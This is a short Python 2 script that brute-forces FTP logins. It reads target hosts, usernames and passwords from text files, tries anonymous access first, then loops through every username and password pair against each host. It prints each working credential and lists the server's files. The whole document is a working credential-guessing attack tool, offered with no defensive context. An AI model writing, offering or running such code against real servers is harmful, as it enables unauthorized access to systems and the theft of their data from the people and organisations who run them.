#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ftplib import FTP


pass_file = open('pass.txt')
passwords = pass_file.readlines()

users_file = open('users.txt')
users = users_file.readlines()

hosts_file = open('hosts.txt')
hosts = hosts_file.readlines()

for host in hosts:
    host = host.strip()
    print '='*80
    print '[*] Trying ' + host + ' for anonymous@'
    try:
        ftp = FTP(host)
        ftp.login()
        ftp.retrlines('LIST')
        ftp.quit()
        print '[+] Success for ' + host + ' anonymous@'
    except:
        print '[*] Starting brute force for ' + host
        for username in users:
            username = username.strip()
            for password in passwords:
                password = password.strip()
                print '[*] Trying ' + username + ' / ' + password
                try:
                    ftp = FTP(host)
                    ftp.login(user=username, passwd=password)
                    print '[+] Success ' + username + ' / ' + password + ' for host ' + host
                    ftp.retrlines('LIST')
                    ftp.quit()
                    break
                except:
                    print '[-] Error ' + username + ' / ' + password
                    pass
